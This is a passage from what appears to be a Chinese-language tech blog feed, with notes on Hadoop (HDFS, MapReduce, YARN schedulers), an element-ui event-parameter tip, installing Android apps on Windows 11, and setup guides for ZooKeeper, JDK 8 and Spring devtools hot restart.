class="hljs sh">hadoop fs -<span class="hljs-built_in">mv</span> /ifnxs/1.txt /ifnxs/333.txt<br></code></pre></td></tr></table></figure><p><a href="https://hadoop.apache.org/docs/r3.3.0/hadoop-project-dist/hadoop-common/FileSystemShell.html">其他命令</a></p><h3 id="HDFS"><a href="#HDFS" class="headerlink" title="HDFS"></a>HDFS</h3><h4 id="官方架构图"><a href="#官方架构图" class="headerlink" title="官方架构图"></a>官方架构图</h4><img src="/2022/01/newpost-28/image-20220106112017961.png" class="" title="image-20220106112017961"><h4 id="namenode职责"><a href="#namenode职责" class="headerlink" title="namenode职责"></a>namenode职责</h4><ul><li><p>NameNode仅<strong>存储HDFS的元数据</strong>：文件系统中所有文件的目录树，并跟踪整个集群中的文件，不存储实际数据。</p></li><li><p>NameNode知道HDFS中任何<strong>给定文件的块列表及其位置</strong>。使用此信息NameNode知道如何从块中构建文件。</p></li><li><p>NameNode<strong>不持久化存储每个文件中各个块所在的datanode的位置信息</strong>，这些信息会在系统启动时从DataNode 重建。</p></li><li><p>NameNode是Hadoop集群中的<strong>单点故障</strong>。</p></li><li><p>NameNode所在机器通常会配置有<strong>大量内存</strong>（RAM）。</p></li></ul><h4 id="datanode职责"><a href="#datanode职责" class="headerlink" title="datanode职责"></a>datanode职责</h4><ul><li><p>DataNode负责<strong>最终数据块block的存储</strong>。是集群的<strong>从角色</strong>，也称为Slave。</p></li><li><p>DataNode启动时，会将自己<strong>注册</strong>到NameNode并<strong>汇报</strong>自己负责持有的块列表。</p></li><li><p>当某个DataNode关闭时，不会影响数据的可用性。 NameNode将安排由其他DataNode管理的块进行副本复制 。</p></li><li><p>DataNode所在机器通常配置有大量的<strong>硬盘</strong>空间，因为实际数据存储在DataNode中。</p></li></ul><h4 id="Pipeline管道"><a href="#Pipeline管道" class="headerlink" title="Pipeline管道"></a>Pipeline管道</h4><p>数据以管道的方式，顺序的沿着一个方向传输，这样能够<strong>充分利用</strong>每个机器的<strong>带宽</strong>，避免网络瓶颈和高延迟时的连接，最小化推送所有数据的延时。</p><h4 id="ACK应答响应"><a href="#ACK应答响应" class="headerlink" title="ACK应答响应"></a>ACK应答响应</h4><p>在HDFS pipeline管道传输数据的过程中，传输的反方向会进行ACK校验，确保数据传输安全。</p><h4 id="默认3副本存储策略"><a href="#默认3副本存储策略" class="headerlink" title="默认3副本存储策略"></a>默认3副本存储策略</h4><p>默认副本存储策略是由<code>BlockPlacementPolicyDefault</code>指定</p><ul><li><p>第一块副本：优先客户端本地，否则随机</p></li><li><p>第二块副本：不同于第一块副本的不同机架</p></li><li><p>第三块副本：第二块副本相同机架不同机器</p></li></ul><img src="/2022/01/newpost-28/image-20220106112240824.png" class="" title="image-20220106112240824"><h4 id="写"><a href="#写" class="headerlink" title="写"></a>写</h4><img src="/2022/01/newpost-28/image-20220106112440776.png" class="" title="image-20220106112440776"><h4 id="读"><a href="#读" class="headerlink" title="读"></a>读</h4><img src="/2022/01/newpost-28/image-20220106112459032.png" class="" title="image-20220106112459032"><h3 id="MapReduce"><a href="#MapReduce" class="headerlink" title="MapReduce"></a>MapReduce</h3><h4 id="思想"><a href="#思想" class="headerlink" title="思想"></a>思想</h4><p><strong>先分再合，分而治之</strong></p><p><strong>不可拆分的计算任务或相互间有依赖关系的数据无法进行并行计算</strong></p><img src="/2022/01/newpost-28/image-20220106134905847.png" class="" title="image-20220106134905847"><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> /export/server/hadoop-3.3.0/share/hadoop/mapreduce/<br>hadoop jar hadoop-mapreduce-examples-3.3.0.jar pi 10 50<br>hadoop jar hadoop-mapreduce-examples-3.3.0.jar wordcount /input /output<br></code></pre></td></tr></table></figure><img src="/2022/01/newpost-28/image-20220106141212687.png" class="" title="image-20220106141212687"><h4 id="MapReduce整体执行流程图"><a href="#MapReduce整体执行流程图" class="headerlink" title="MapReduce整体执行流程图"></a>MapReduce整体执行流程图</h4><img src="/2022/01/newpost-28/image-20220106141404919.png" class="" title="image-20220106141404919"><h4 id="Map阶段执行流程"><a href="#Map阶段执行流程" class="headerlink" title="Map阶段执行流程"></a>Map阶段执行流程</h4><ol><li><strong>逻辑切片</strong>，默认Split size = Block size（128M）</li><li>对切片中的数据按照一定的规则读取解析返回[key,value]对。默认是<strong>按行读取数据</strong>。key是每一行的起始位置偏移量，value是本行的文本内容</li><li>调用Mapper类中的<strong>map方法处理数据</strong></li><li>按照一定的规则对Map输出的键值对进行<strong>分区partition</strong>。默认不分区，因为只有一个reducetask。分区的数量就是reducetask运行的数量</li><li>Map输出数据写入<strong>内存缓冲区</strong>，达到比例溢出到磁盘上。<strong>溢出spill</strong>的时候根据key进行<strong>排序sort</strong>。默认根据key字典序排序</li><li>对所有溢出文件进行最终的<strong>merge合并</strong>，成为一个文件</li></ol><img src="/2022/01/newpost-28/image-20220106142245210.png" class="" title="image-20220106142245210"><h4 id="Reduce阶段执行过程"><a href="#Reduce阶段执行过程" class="headerlink" title="Reduce阶段执行过程"></a>Reduce阶段执行过程</h4><ol><li><p>ReduceTask会<strong>主动</strong>从MapTask复制拉取属于需要自己处理的数据</p></li><li><p>把拉取来数据，全部进行<strong>合并merge</strong>，即把分散的数据合并成一个大的数据。再对合并后的数据排序</p></li><li><p>对排序后的键值对<strong>调用reduce方法</strong>。<strong>键相等</strong>的键值对调用一次reduce方法。最后把这些输出的键值对 写入到HDFS文件中</p></li></ol><img src="/2022/01/newpost-28/image-20220106143934250.png" class="" title="image-20220106143934250"><h4 id="shuffle概念"><a href="#shuffle概念" class="headerlink" title="shuffle概念"></a>shuffle概念</h4><p>将map端的无规则输出按指定的规则“打乱”成具有<strong>一定规则</strong>的数据，以便reduce端接收处理</p><p>一般把从Map产生输出开始到Reduce取得数据作为输入之前的过程称作shuffle</p><p><strong>Shuffle是MapReduce程序的核心与精髓，也是慢的原因</strong></p><h3 id="YARN"><a href="#YARN" class="headerlink" title="YARN"></a>YARN</h3><p>YARN是一个通用<strong>资源管理系统</strong>和<strong>调度平台</strong></p><h4 id="架构图"><a href="#架构图" class="headerlink" title="架构图"></a>架构图</h4><img src="/2022/01/newpost-28/yarn_architecture.gif" class="" title="MapReduce NextGen Architecture"><h4 id="三大组件"><a href="#三大组件" class="headerlink" title="三大组件"></a>三大组件</h4><h5 id="ResourceManager（RM）"><a href="#ResourceManager（RM）" class="headerlink" title="ResourceManager（RM）"></a>ResourceManager（RM）</h5><p>YARN集群中的主角色，决定系统中所有应用程序之间资源分配的<strong>最终权限，即最终仲裁者</strong>。接收用户的作业提交，并通过NM分配、管理各个机器上的计算资源。</p><h5 id="NodeManager（NM）"><a href="#NodeManager（NM）" class="headerlink" title="NodeManager（NM）"></a>NodeManager（NM）</h5><p>YARN中的从角色，一台机器上一个，负责<strong>管理本机器上的计算资源</strong>。根据RM命令，启动Container容器、监视容器的资源使用情况。并且向RM主角色汇报资源使用情况。</p><h5 id="ApplicationMaster（AM）"><a href="#ApplicationMaster（AM）" class="headerlink" title="ApplicationMaster（AM）"></a>ApplicationMaster（AM）</h5><p>用户提交的每个应用程序均包含一个AM。<strong>应用程序内的“老大”</strong>，负责程序内部各阶段的资源申请，监督程序的执行情况。</p><h4 id="交互流程"><a href="#交互流程" class="headerlink" title="交互流程"></a>交互流程</h4><img src="/2022/01/newpost-28/image-20220106160514463.png" class="" title="image-20220106160514463"><ol><li>用户通过客户端向YARN中ResourceManager提交应用程序（比如hadoop jar提交MR程序）；</li><li>ResourceManager为该应用程序分配第一个Container（容器），并与对应的NodeManager通信，要求 它在这个Container中启动这个应用程序的ApplicationMaster；</li><li>ApplicationMaster启动成功之后，首先向ResourceManager注册并保持通信，这样用户可以直接通过 ResourceManager查看应用程序的运行状态（处理了百分之几）；</li><li>AM为本次程序内部的各个Task任务向RM申请资源，并监控它的运行状态；</li><li>一旦 ApplicationMaster 申请到资源后，便与对应的 NodeManager 通信，要求它启动任务；</li><li>NodeManager 为任务设置好运行环境后，将任务启动命令写到一个脚本中，并通过运行该脚本启动任务；</li><li>各个任务通过某个 RPC 协议向 ApplicationMaster 汇报自己的状态和进度，以让ApplicationMaster 随 时掌握各个任务的运行状态，从而可以在任务失败时重新启动任务。在应用程序运行过程中，用户可随时通过 RPC 向 ApplicationMaster 查询应用程序的当前运行状态；</li><li>应用程序运行完成后，ApplicationMaster 向 ResourceManager 注销并关闭自己。</li></ol><h4 id="调度器策略"><a href="#调度器策略" class="headerlink" title="调度器策略"></a>调度器策略</h4><h5 id="FIFO-Scheduler-先进先出调度器"><a href="#FIFO-Scheduler-先进先出调度器" class="headerlink" title="FIFO Scheduler 先进先出调度器"></a>FIFO Scheduler 先进先出调度器</h5><p>FIFO Scheduler是一个先进先出的思想，即先提交的应用先运行。</p><img src="/2022/01/newpost-28/image-20220106161131577.png" class="" title="image-20220106161131577"><h5 id="Capacity-Scheduler-容量调度器"><a href="#Capacity-Scheduler-容量调度器" class="headerlink" title="Capacity Scheduler 容量调度器"></a>Capacity Scheduler 容量调度器</h5><p>Capacity Scheduler容量调度是<strong>Apache Hadoop3.x默认调度策略</strong>。该策略允许<strong>多个组织共享整个集群资源</strong>，每个组织可以获得集群的一部分计算能力。通过为每个组织分配专门的队列，然后再为每个队列分配一定的集群资源，这样整个集群就可以通过设置多个队列的方式给多个组织提供服务了。</p><img src="/2022/01/newpost-28/image-20220106161147048.png" class="" title="image-20220106161147048"><ul><li><p>层次化的队列设计</p><p>层次化的管理，可以更容易、更合理分配和限制资源的使用</p></li><li><p>容量保证</p><p>每个队列上都可以设置一个资源的占比，保证每个队列都不会占用整个集群的资源</p></li><li><p>安全</p><p>每个队列有严格的访问控制。用户只能向自己的队列里面提交任务，而且不能修改或者访问其他队列的任务</p></li><li><p>弹性分配</p><p>空闲的资源可以被分配给任何队列。当多个队列出现争用的时候，则会按照权重比例进行平衡</p></li></ul><h5 id="Fair-Scheduler-公平调度器"><a href="#Fair-Scheduler-公平调度器" class="headerlink" title="Fair Scheduler 公平调度器"></a>Fair Scheduler 公平调度器</h5><p>使所有应用在平均情况下随着时间的流逝可以获得相等的资源份额。</p><img src="/2022/01/newpost-28/image-20220106161406620.png" class="" title="image-20220106161406620"><ul><li><p><strong>分层队列</strong></p><p>队列可以按层次结构排列以划分资源，并可以配置权重以按特定比例共享集群。</p></li><li><p>基于用户或组的队列映射</p><p>可以根据提交任务的用户名或组来分配队列。如果任务指定了一个队列,则在该队列中提交任务</p></li><li><p><strong>资源抢占</strong></p><p>根据应用的配置，抢占和分配资源可以是友好的或是强制的。默认不启用资源抢占</p></li><li><p>保证最小配额</p><p>可以设置队列最小资源，允许将保证的最小份额分配给队列，保证用户可以启动任务。当队列不能满足最小资源时,可以从其它队列抢占。当队列资源使用不完时,可以给其它队列使用。这对于确保某些用户、组或生产应用始终获得足够的资源</p></li><li><p><strong>允许资源共享</strong></p><p>即当一个应用运行时,如果其它队列没有任务执行,则可以使用其它队列,当其它队列有应用需要资源时再将占用的队列释放出来。所有的应用都从资源队列中分配资源</p></li><li><p>默认不限制每个队列和用户可以同时运行应用的数量</p><p>可以配置来限制队列和用户并行执行的应用数量。限制并行执行应用数量不会导致任务提交失败,超出的应用会在队列中等待</p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
      <tag>大数据</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>element-ui 自带事件添加自定义参数</title>
    <link href="/2021/12/newpost-27/"/>
    <url>/2021/12/newpost-27/</url>
    
    <content type="html"><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>在使用<code>element-ui</code>自带事件，例如<code>@change</code>，添加自定义参数，并且保留原有参数</p><span id="more"></span><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">@change=<span class="hljs-string">&#x27;change($event,scope.row)&#x27;</span><br></code></pre></td></tr></table></figure><p>其中<code>$event</code>就是自带的参数，<code>scope.row</code>替换成你想要的参数就可以了</p><p>或者也可以这样写</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">@change=<span class="hljs-string">&#x27;(val)=&gt;change(value,scope.row)&#x27;</span><br></code></pre></td></tr></table></figure><p>参考链接<a href="https://www.cnblogs.com/knuzy/p/11097150.html">element-ui @change添加自定义参数</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>前端</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows 11安装安卓应用程序</title>
    <link href="/2021/12/newpost-26/"/>
    <url>/2021/12/newpost-26/</url>
    
    <content type="html"><![CDATA[<h2 id="一、目的"><a href="#一、目的" class="headerlink" title="一、目的"></a>一、目的</h2><p>在windows 11中通过windows 11自带的子系统功能，实现自由安装安卓应用程序</p><span id="more"></span><h2 id="二、实现"><a href="#二、实现" class="headerlink" title="二、实现"></a>二、实现</h2><h3 id="1、前提"><a href="#1、前提" class="headerlink" title="1、前提"></a>1、前提</h3><p>首先，你需要一台windows 11系统的计算机，并且使用的是<strong>预览版系统中的beta或dev渠道</strong>（截止本文创作时，2021-12-07，正式版系统尚未提供安卓子系统），并把系统更新到最新版本，如果这一步做不到，请自行百度</p><h3 id="2、更新系统后打开Microsoft-Store，会在标题旁边出现PREVIEW，如下图"><a href="#2、更新系统后打开Microsoft-Store，会在标题旁边出现PREVIEW，如下图" class="headerlink" title="2、更新系统后打开Microsoft Store，会在标题旁边出现PREVIEW，如下图"></a>2、更新系统后打开Microsoft Store，会在标题旁边出现PREVIEW，如下图</h3><img src="/2021/12/newpost-26/image-20211207104243956.png" class="" title="image-20211207104243956"><h3 id="3、安装Windows-Subsystem-for-Android"><a href="#3、安装Windows-Subsystem-for-Android" class="headerlink" title="3、安装Windows Subsystem for Android"></a>3、安装Windows Subsystem for Android</h3><h5 id="1-系统中搜索启用或关闭-Windows-功能并打开，勾选下图中的几个。如果发现没有这几个功能，就要先到BIOS-UEFI-开启「-Virtualization-」和「-Hyper-V-」相关的功能；"><a href="#1-系统中搜索启用或关闭-Windows-功能并打开，勾选下图中的几个。如果发现没有这几个功能，就要先到BIOS-UEFI-开启「-Virtualization-」和「-Hyper-V-」相关的功能；" class="headerlink" title="1.系统中搜索启用或关闭 Windows 功能并打开，勾选下图中的几个。如果发现没有这几个功能，就要先到BIOS/UEFI 开启「 Virtualization 」和「 Hyper-V 」相关的功能；"></a>1.系统中搜索<code>启用或关闭 Windows 功能</code>并打开，勾选下图中的几个。如果发现没有这几个功能，就要先到BIOS/UEFI 开启「 Virtualization 」和「 Hyper-V 」相关的功能；</h5><img src="/2021/12/newpost-26/image-20211207104700638.png" class="" title="image-20211207104700638"><h5 id="2-设置-时间和语言-语言-amp-区域，把windows-显示语言改为English-United-States-，然后注销账户重新登录，之后还是到这个菜单，把Country-or-region改成United-States，Regional-format改成English-United-States"><a href="#2-设置-时间和语言-语言-amp-区域，把windows-显示语言改为English-United-States-，然后注销账户重新登录，之后还是到这个菜单，把Country-or-region改成United-States，Regional-format改成English-United-States" class="headerlink" title="2.设置-时间和语言-语言&amp;区域，把windows 显示语言改为English (United States)，然后注销账户重新登录，之后还是到这个菜单，把Country or region改成United States，Regional format改成English (United States)"></a>2.设置-时间和语言-语言&amp;区域，把windows 显示语言改为<code>English (United States)</code>，然后注销账户重新登录，之后还是到这个菜单，把<code>Country or region</code>改成<code>United States</code>，<code>Regional format</code>改成<code>English (United States)</code></h5><h5 id="3-点这里跳转Microsoft-Store-网页版，在弹出窗口一定要选保留使用United-States-–-English，然后点击GET，然后浏览器会有弹框，点击允许跳转，之后会跳转到Microsoft-Store，点击install，就会安装Amazon-Appstore和Windows-Subsystem-for-Android，等待安装完成。之后可以反向操作，把系统语言改成中文。"><a href="#3-点这里跳转Microsoft-Store-网页版，在弹出窗口一定要选保留使用United-States-–-English，然后点击GET，然后浏览器会有弹框，点击允许跳转，之后会跳转到Microsoft-Store，点击install，就会安装Amazon-Appstore和Windows-Subsystem-for-Android，等待安装完成。之后可以反向操作，把系统语言改成中文。" class="headerlink" title="3.点这里跳转Microsoft Store 网页版，在弹出窗口一定要选保留使用United States – English，然后点击GET，然后浏览器会有弹框，点击允许跳转，之后会跳转到Microsoft Store，点击install，就会安装Amazon Appstore和Windows Subsystem for Android，等待安装完成。之后可以反向操作，把系统语言改成中文。"></a>3.<a href="https://www.microsoft.com/en-us/p/windows-subsystem-for-android/9p3395vx91nr?activetab=pivot:overviewtab">点这里</a>跳转Microsoft Store 网页版，在弹出窗口一定要选<code>保留使用United States – English</code>，然后点击<code>GET</code>，然后浏览器会有弹框，点击允许跳转，之后会跳转到Microsoft Store，点击<code>install</code>，就会安装<code>Amazon Appstore</code>和<code>Windows Subsystem for Android</code>，等待安装完成。之后可以反向操作，把系统语言改成中文。</h5><p>至此，如果你身在美国，已经可以在亚马逊应用商店下载安卓应用程序了，但里边应用程序有限，且需要身在美国，想自由安装应用程序接着往下看。</p><h3 id="4、设置安卓子系统的开发者模式"><a href="#4、设置安卓子系统的开发者模式" class="headerlink" title="4、设置安卓子系统的开发者模式"></a>4、设置安卓子系统的开发者模式</h3><p>在开始菜单中找到<code>适用于 Android 的 Windows 子系统设置</code>，打开开发人员模式</p><img src="/2021/12/newpost-26/image-20211207105945711.png" class="" title="image-20211207105945711"><p>然后点击<code>开发人员模式</code>下边的小蓝字<code>管理开发人员设置</code>，开启USB调试和无线调试</p><img src="/2021/12/newpost-26/image-20211207110121037.png" class="" title="image-20211207110121037"><p>至此，有adb调试经验的朋友已经知道怎么做了，对于不太有经验的朋友，可以去<code>Microsoft Store</code>下载<code>WSATools</code>，第一次打开需要找个文件夹安装ADB，然后就能通过这个软件自由安装apk了。</p><img src="/2021/12/newpost-26/image-20211207110602464.png" class="" title="image-20211207110602464"><p>安装后会在开始菜单展示应用程序，部分app可能不适配，还经常出现闪退，总之目前这安卓子系统不够稳定（不排除是我电脑的问题）。</p><img src="/2021/12/newpost-26/image-20211207111409339.png" class="" title="image-20211207111409339"><img src="/2021/12/newpost-26/image-20211207111418981.png" class="" title="image-20211207111418981">]]></content>
    
    
    
    <tags>
      
      <tag>经验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>centos7安装zookeeper</title>
    <link href="/2021/11/newpost-25/"/>
    <url>/2021/11/newpost-25/</url>
    
    <content type="html"><![CDATA[<h3 id="一、下载并解压"><a href="#一、下载并解压" class="headerlink" title="一、下载并解压"></a>一、下载并解压</h3><p><a href="https://zookeeper.apache.org/releases.html">下载地址</a></p><span id="more"></span><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir /usr/local/zookeeper<br>cd /usr/local/zookeeper<br>wget https://dlcdn.apache.org/zookeeper/zookeeper-3.7.0/apache-zookeeper-3.7.0-bin.tar.gz<br>tar -zxvf apache-zookeeper-3.7.0-bin.tar.gz<br>mv apache-zookeeper-3.7.0-bin apache-zookeeper-3.7.0<br></code></pre></td></tr></table></figure><h3 id="二、修改配置文件"><a href="#二、修改配置文件" class="headerlink" title="二、修改配置文件"></a>二、修改配置文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd apache-zookeeper-3.7.0/conf<br>cp zoo_sample.cfg zoo.cfg<br>vi zoo.cfg<br></code></pre></td></tr></table></figure><p>结尾加上<code>admin.serverPort=8090</code>并保存（端口默认8080，不改也行）</p><h3 id="三、环境变量"><a href="#三、环境变量" class="headerlink" title="三、环境变量"></a>三、环境变量</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vi /etc/profile<br></code></pre></td></tr></table></figure><p>在末尾添加以下后保存，如果path有值了，就加冒号在末尾追加</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini">export <span class="hljs-attr">ZOOKEEPER_HOME</span>=/usr/local/zookeeper/apache-zookeeper-<span class="hljs-number">3.7</span>.<span class="hljs-number">0</span><br>export <span class="hljs-attr">PATH</span>=<span class="hljs-variable">$PATH</span>:<span class="hljs-variable">$ZOOKEEPER_HOME</span>/bin<br></code></pre></td></tr></table></figure><p>追加示例：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini">export <span class="hljs-attr">PATH</span>=<span class="hljs-variable">$PATH</span>:<span class="hljs-variable">$JAVA_HOME</span>/bin:<span class="hljs-variable">$ZOOKEEPER_HOME</span>/bin<br></code></pre></td></tr></table></figure><p>刷新配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">source /etc/profile<br></code></pre></td></tr></table></figure><h3 id="四、启动"><a href="#四、启动" class="headerlink" title="四、启动"></a>四、启动</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">zkServer.sh start<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>centos7安装jdk8</title>
    <link href="/2021/11/newpost-24/"/>
    <url>/2021/11/newpost-24/</url>
    
    <content type="html"><![CDATA[<h3 id="一、检查是否已安装"><a href="#一、检查是否已安装" class="headerlink" title="一、检查是否已安装"></a>一、检查是否已安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">rpm -qa | grep java<br></code></pre></td></tr></table></figure><span id="more"></span><p>如果没有安装java不会有任何返回，如下图</p><img src="/2021/11/newpost-24/image-20211109172218407.png" class="" title="image-20211109172218407"><h3 id="二、下载JDK并解压"><a href="#二、下载JDK并解压" class="headerlink" title="二、下载JDK并解压"></a>二、下载JDK并解压</h3><p>可以使用华为的镜像</p><p><code>https://repo.huaweicloud.com/java/jdk/</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir /usr/local/java<br>cd /usr/local/java<br>wget https://repo.huaweicloud.com/java/jdk/8u202-b08/jdk-8u202-linux-x64.tar.gz<br>tar -zxvf jdk-8u202-linux-x64.tar.gz<br></code></pre></td></tr></table></figure><h3 id="三、配置环境变量"><a href="#三、配置环境变量" class="headerlink" title="三、配置环境变量"></a>三、配置环境变量</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vi /etc/profile<br></code></pre></td></tr></table></figure><p>在末尾添加以下后保存</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini">export <span class="hljs-attr">JAVA_HOME</span>=/usr/local/java/jdk1.<span class="hljs-number">8.0</span>_202<br>export <span class="hljs-attr">CLASSPATH</span>=.:<span class="hljs-variable">$JAVA_HOME</span>/jre/lib/rt.jar:<span class="hljs-variable">$JAVA_HOME</span>/lib/dt.jar:<span class="hljs-variable">$JAVA_HOME</span>/lib/tools.jar<br>export <span class="hljs-attr">PATH</span>=<span class="hljs-variable">$PATH</span>:<span class="hljs-variable">$JAVA_HOME</span>/bin<br></code></pre></td></tr></table></figure><p>刷新配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">source /etc/profile<br></code></pre></td></tr></table></figure><p>检查是否成功</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">java -<span class="hljs-built_in">version</span><br></code></pre></td></tr></table></figure><img src="/2021/11/newpost-24/image-20211109173556849.png" class="" title="image-20211109173556849">]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>用idea开发spring项目过程中热重启</title>
    <link href="/2021/11/newpost-23/"/>
    <url>/2021/11/newpost-23/</url>
    
    <content type="html"><![CDATA[<h2 id="一、目标"><a href="#一、目标" class="headerlink" title="一、目标"></a>一、目标</h2><p>在用idea开发spring项目过程中，修改代码自动热重启，无需手动操作。</p><span id="more"></span><h2 id="二、实现"><a href="#二、实现" class="headerlink" title="二、实现"></a>二、实现</h2><h3 id="1、添加依赖"><a href="#1、添加依赖" class="headerlink" title="1、添加依赖"></a>1、添加依赖</h3><p>在pom文件中添加以下依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-devtools<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2、开启maven插件"><a href="#2、开启maven插件" class="headerlink" title="2、开启maven插件"></a>2、开启maven插件</h3><p>在pom文件中开启maven插件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">fork</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">fork</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">addResources</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">addResources</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如果使用父工程，只需在父工程pom文件开启maven插件即可</p><h3 id="3、idea配置"><a href="#3、idea配置" class="headerlink" title="3、idea配置"></a>3、idea配置</h3><h4 id="1-如下4个全部打勾后保存"><a href="#1-如下4个全部打勾后保存" class="headerlink" title="1.如下4个全部打勾后保存"></a>1.如下4个全部打勾后保存</h4><img src="/2021/11/newpost-23/image-20211105153505610.png" class="" title="image-20211105153505610"><h4 id="2-更新值"><a href="#2-更新值" class="headerlink" title="2.更新值"></a>2.更新值</h4><p>按快捷键<code>Ctrl+Shift+Alt+/</code>，得到下图，选择第一个</p><img src="/2021/11/newpost-23/image-20211105152646721.png" class="" title="image-20211105152646721"><p>找到下图中两个勾上</p><img src="/2021/11/newpost-23/image-20211105152853032.png" class="" title="image-20211105152853032"><h3 id="4、重启idea"><a href="#4、重启idea" class="headerlink" title="4、重启idea"></a>4、重启idea</h3><h3 id="5、多项目解决"><a href="#5、多项目解决" class="headerlink" title="5、多项目解决"></a>5、多项目解决</h3><p>如果有多个项目，可能热重启被占用，导致后起的项目热重启不生效，可以通过改默认端口解决，在配置文件<code>application.xml</code>中添加如下，其中端口默认是<code>35729</code>，只要改成和<code>35729</code>不一样，且不和别的项目重复就可以</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">devtools:</span><br>    <span class="hljs-attr">livereload:</span><br>      <span class="hljs-attr">port:</span> <span 